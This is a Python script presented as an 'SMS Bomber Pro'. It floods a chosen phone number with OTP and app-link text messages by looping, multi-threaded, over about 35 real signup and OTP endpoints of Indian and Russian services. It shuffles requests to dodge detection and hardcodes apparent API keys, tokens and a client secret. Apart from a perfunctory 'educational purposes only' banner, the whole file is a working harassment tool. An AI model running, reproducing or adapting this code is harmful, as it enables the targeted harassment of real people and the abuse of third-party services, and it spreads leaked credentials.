import requests
import logging
import random
import time
import threading
import sys
from datetime import datetime

# Configure logging with emojis
logging.basicConfig(
    format='%(asctime)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

class HACKERNEERSMSBomber:
    def __init__(self, phone_number, country_code="91"):
        self.phone = phone_number
        self.country_code = country_code
        self.user_agent = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        self.active = True
        self.success_count = 0
        self.fail_count = 0
        self.api_stats = {}
        self.lock = threading.Lock()
        
        # Load ALL APIs
        self.apis = self._load_all_apis()
        
    def _load_all_apis(self):
        """Load all APIs from the provided JSON structure"""
        apis = []
        
        # Indian APIs (country code 91)
        indian_apis = [
            # ConfirmTKT
            {
                "name": "ConfirmTKT",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {"newOtp": "true", "mobileNumber": self.phone},
                "identifier": "false"
            },
            # JustDial
            {
                "name": "JustDial",
                "method": "GET",
                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                "params": {"mobile": self.phone},
                "identifier": "sent"
            },
            # Allen Solly
            {
                "name": "Allen Solly",
                "method": "POST",
                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                "data": {"mobileoremail": self.phone, "name": "markluther"},
                "identifier": "true"
            },
            # Frotels
            {
                "name": "Frotels",
                "method": "POST",
                "url": "https://www.frotels.com/appsendsms.php",
                "data": {"mobno": self.phone},
                "identifier": "sent"
            },
            # GAPOON
            {
                "name": "GAPOON",
                "method": "POST",
                "url": "https://www.gapoon.com/userSignup",
                "data": {
                    "mobile": self.phone,
                    "email": "noreply@gmail.com",
                    "name": "LexLuthor"
                },
                "identifier": "1"
            },
            # Housing
            {
                "name": "Housing",
                "method": "POST",
                "url": "https://login.housing.com/api/v2/send-otp",
                "data": {"phone": self.phone},
                "identifier": "Sent"
            },
            # Porter
            {
                "name": "Porter",
                "method": "POST",
                "url": "https://porter.in/restservice/send_app_link_sms",
                "data": {"phone": self.phone, "referrer_string": "", "brand": "porter"},
                "identifier": "true"
            },
            # Cityflo
            {
                "name": "Cityflo",
                "method": "POST",
                "url": "https://cityflo.com/website-app-download-link-sms/",
                "data": {"mobile_number": self.phone},
                "identifier": "sent"
            },
            # NNNOW
            {
                "name": "NNNOW",
                "method": "POST",
                "url": "https://api.nnnow.com/d/api/appDownloadLink",
                "data": {"mobileNumber": self.phone},
                "identifier": "true"
            },
            # AJIO
            {
                "name": "AJIO",
                "method": "POST",
                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
                "data": {
                    "firstName": "xxps",
                    "login": "wiqpdl223@wqew.com",
                    "password": "QASpw@1s",
                    "genderType": "Male",
                    "mobileNumber": self.phone,
                    "requestType": "SENDOTP"
                },
                "identifier": "1"
            },
            # HappyEasyGo
            {
                "name": "HappyEasyGo",
                "method": "GET",
                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
                "params": {"phone": f"91 {self.phone}"},
                "identifier": "true"
            },
            # Unacademy
            {
                "name": "Unacademy",
                "method": "POST",
                "url": "https://unacademy.com/api/v1/user/get_app_link/",
                "data": {"phone": self.phone},
                "identifier": "sent"
            },
            # Treebo
            {
                "name": "Treebo",
                "method": "POST",
                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
                "data": {"phone_number": self.phone},
                "identifier": "sent"
            },
            # Airtel
            {
                "name": "Airtel",
                "method": "GET",
                "url": "https://www.airtel.in/referral-api/core/notify",
                "params": {"messageId": "map", "rtn": self.phone},
                "identifier": "Success"
            },
            # PharmEasy
            {
                "name": "PharmEasy",
                "method": "POST",
                "url": "https://pharmeasy.in/api/auth/requestOTP",
                "json": {"contactNumber": self.phone},
                "identifier": "resendSmsCounter"
            },
            # MylesCars
            {
                "name": "MylesCars",
                "method": "POST",
                "url": "https://www.mylescars.com/usermanagements/chkContact",
                "data": {"contactNo": self.phone},
                "identifier": "success@::::"
            },
            # Grofers
            {
                "name": "Grofers",
                "method": "POST",
                "url": "https://grofers.com/v2/accounts/",
                "data": {"user_phone": self.phone},
                "headers": {
                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
                },
                "identifier": "We have sent"
            },
            # Dream11
            {
                "name": "Dream11",
                "method": "POST",
                "url": "https://api.dream11.com/sendsmslink",
                "data": {
                    "siteId": "1",
                    "mobileNum": self.phone,
                    "appType": "androidfull"
                },
                "identifier": "true"
            },
            # Cashify
            {
                "name": "Cashify",
                "method": "GET",
                "url": "https://www.cashify.in/api/cu01/v1/app-link",
                "params": {"mn": self.phone},
                "identifier": "Successfully"
            },
            # Paytm
            {
                "name": "Paytm",
                "method": "POST",
                "url": "https://commonfront.paytm.com/v4/api/sendsms",
                "data": {
                    "phone": self.phone,
                    "guid": "2952fa812660c58dc160ca6c9894221d"
                },
                "identifier": "202"
            },
            # KFC India
            {
                "name": "KFC India",
                "method": "POST",
                "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                "headers": {
                    "Referer": "https://online.kfc.co.in/login",
                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
                },
                "json": {
                    "AuthorizedFor": "3",
                    "phoneNumber": self.phone,
                    "Resend": "false"
                },
                "identifier": "true"
            },
            # IndiaLends
            {
                "name": "IndiaLends",
                "method": "POST",
                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                "headers": {"Referer": "https://indialends.com/personal-loan"},
                "data": {
                    "aeyder03teaeare": "1",
                    "ertysvfj74sje": self.country_code,
                    "jfsdfu14hkgertd": self.phone,
                    "lj80gertdfg": "0"
                },
                "identifier": "1"
            },
            # Flipkart
            {
                "name": "Flipkart",
                "method": "POST",
                "url": "https://www.flipkart.com/api/5/user/otp/generate",
                "data": {"loginId": f"+{self.country_code}{self.phone}"},
                "headers": {
                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "identifier": "emailMask"
            },
            # Redbus
            {
                "name": "Redbus",
                "method": "GET",
                "url": "https://m.redbus.in/api/getOtp",
                "params": {
                    "number": self.phone,
                    "cc": self.country_code,
                    "whatsAppOpted": "false"
                },
                "identifier": "200"
            }
        ]
        
        # Multi-country APIs
        multi_country_apis = [
            # Qlean
            {
                "name": "Qlean",
                "method": "POST",
                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                "data": {"phone": f"{self.country_code}{self.phone}"},
                "identifier": "request_id"
            },
            # Mail.ru
            {
                "name": "Mail.ru",
                "method": "POST",
                "url": "https://cloud.mail.ru/api/v2/notify/applink",
                "data": {
                    "phone": f"+{self.country_code}{self.phone}",
                    "api": "2",
                    "email": "email",
                    "x-email": "x-email"
                },
                "identifier": "200"
            },
            # Tinder
            {
                "name": "Tinder",
                "method": "POST",
                "url": "https://api.gotinder.com/v2/auth/sms/send",
                "data": {"phone_number": f"{self.country_code}{self.phone}"},
                "params": {"auth_type": "sms", "locale": "ru"},
                "identifier": "200"
            },
            # Youla
            {
                "name": "Youla",
                "method": "POST",
                "url": "https://youla.ru/web-api/auth/request_code",
                "data": {"phone": f"+{self.country_code}{self.phone}"},
                "identifier": ":6"
            },
            # IVI
            {
                "name": "IVI",
                "method": "POST",
                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                "data": {"phone": f"{self.country_code}{self.phone}"},
                "identifier": "true"
            },
            # Delitime
            {
                "name": "Delitime",
                "method": "POST",
                "url": "https://api.delitime.ru/api/v2/signup",
                "data": {
                    "SignupForm[username]": f"{self.country_code}{self.phone}",
                    "SignupForm[device_type]": "3"
                },
                "identifier": "true"
            },
            # ICQ
            {
                "name": "ICQ",
                "method": "POST",
                "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
                "data": {
                    "msisdn": f"{self.country_code}{self.phone}",
                    "locale": "en",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "45559"
                },
                "identifier": "200"
            },
            # IVI TV
            {
                "name": "IVI TV",
                "method": "POST",
                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
                "data": {
                    "phone": f"{self.country_code}{self.phone}",
                    "device": "Windows+v.43+Chrome+v.7453451",
                    "app_version": "870"
                },
                "identifier": "true"
            },
            # Newton Schools
            {
                "name": "Newton Schools",
                "method": "POST",
                "url": "https://my.newtonschool.co/api/v1/user/otp/",
                "data": {"phone": f"+{self.country_code}{self.phone}"},
                "params": {"registration": True},
                "identifier": "S003"
            },
            # QIWI
            {
                "name": "QIWI",
                "method": "POST",
                "url": "https://mobile-api.qiwi.com/oauth/authorize",
                "data": {
                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                    "username": f"{self.country_code}{self.phone}",
                    "client_id": "android-qw",
                    "client_secret": "zAm4FKq9UnSe7id"
                },
                "identifier": "confirmation_id"
            }
        ]
        
        # Combine all APIs
        all_apis = indian_apis + multi_country_apis
        
        # Add country code to each API
        for api in all_apis:
            api["cc"] = self.country_code
            
        return all_apis
    
    def _send_request(self, api):
        try:
            # Replace placeholders
            url = api["url"].replace("{target}", self.phone).replace("{cc}", self.country_code)
            
            # Prepare request data
            request_data = {}
            if "data" in api:
                request_data = {k: v.replace("{target}", self.phone).replace("{cc}", self.country_code) 
                              if isinstance(v, str) else v 
                              for k, v in api["data"].items()}
            
            headers = {
                "User-Agent": self.user_agent,
                **api.get("headers", {})
            }
            
            cookies = api.get("cookies", {})
            
            # Send request
            if api["method"] == "POST":
                if "json" in api:
                    response = requests.post(url, json=api["json"], headers=headers, cookies=cookies, timeout=10)
                else:
                    response = requests.post(url, data=request_data, headers=headers, cookies=cookies, timeout=10)
            else:
                params = request_data if "data" in api else api.get("params", {})
                response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
            
            # Check success
            identifier = api.get("identifier", "")
            success = False
            if identifier:
                if identifier.isdigit():  # Status code check
                    success = str(response.status_code) == identifier
                else:  # Text identifier check
                    success = identifier.lower() in response.text.lower()
            else:
                success = response.status_code == 200
            
            # Update stats
            with self.lock:
                if success:
                    self.success_count += 1
                    self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
                    log_msg = f"🎯 [SUCCESS] {api['name']} → +{self.country_code}{self.phone}"
                    print(log_msg)
                else:
                    self.fail_count += 1
                    log_msg = f"❌ [FAILED] {api['name']} → Status: {response.status_code}"
                    print(log_msg)
            
            return success
            
        except Exception as e:
            with self.lock:
                self.fail_count += 1
                log_msg = f"⚠️ [ERROR] {api.get('name', 'Unknown')} → {str(e)}"
                print(log_msg)
            return False
    
    def start_bombing(self, delay=1, max_threads=15):
        """Start multi-threaded bombing"""
        print(f"🚀 Starting Ultimate SMS Bomber on +{self.country_code}{self.phone}")
        print(f"🔍 Loaded {len(self.apis)} APIs for country code {self.country_code}")
        print(f"⚡ Running with {max_threads} concurrent threads")
        
        while self.active:
            # Shuffle APIs to avoid pattern detection
            random.shuffle(self.apis)
            
            active_threads = []
            
            for api in self.apis:
                if not self.active:
                    break
                
                # Wait if too many active threads
                while threading.active_count() > max_threads:
                    time.sleep(0.1)
                    if not self.active:
                        break
                
                if not self.active:
                    break
                
                # Create and start thread
                t = threading.Thread(target=self._send_request, args=(api,))
                t.start()
                active_threads.append(t)
                
                time.sleep(delay)
            
            # Wait for current batch to complete
            for t in active_threads:
                t.join()
    
    def stop(self):
        """Stop the bombing process"""
        self.active = False
        stats = self.get_stats()
        print(f"\n🛑 Bombing stopped!")
        print(f"✅ Success: {stats['success']}")
        print(f"❌ Failed: {stats['failed']}")
        print("📊 Top Performing APIs:")
        for api, count in sorted(stats["api_stats"].items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"   🏆 {api}: {count} hits")
    
    def get_stats(self):
        """Get current stats"""
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "api_stats": self.api_stats
        }

def show_banner():
    print("""
    ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
    ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
    ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
    ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    """)
    print("🔥 HACKERNEER SMS Bomber Pro | Developer: HACKER NEER 🔥\n")
    print("⚠️ WARNING: For educational purposes only! ⚠️\n")

if __name__ == "__main__":
    show_banner()
    
    phone = input("📱 Enter phone number (without country code): ").strip()
    country_code = input("🌍 Enter country code (e.g. 91 for India): ").strip()
    
    bomber = HACKERNEERSMSBomber(phone, country_code)
    
    try:
        # Start in background thread
        bomb_thread = threading.Thread(target=bomber.start_bombing)
        bomb_thread.start()
        
        # Run until stopped
        input("\nPress Enter to stop bombing...\n")
        bomber.stop()
        bomb_thread.join()
        
    except KeyboardInterrupt:
        bomber.stop()
        bomb_thread.join()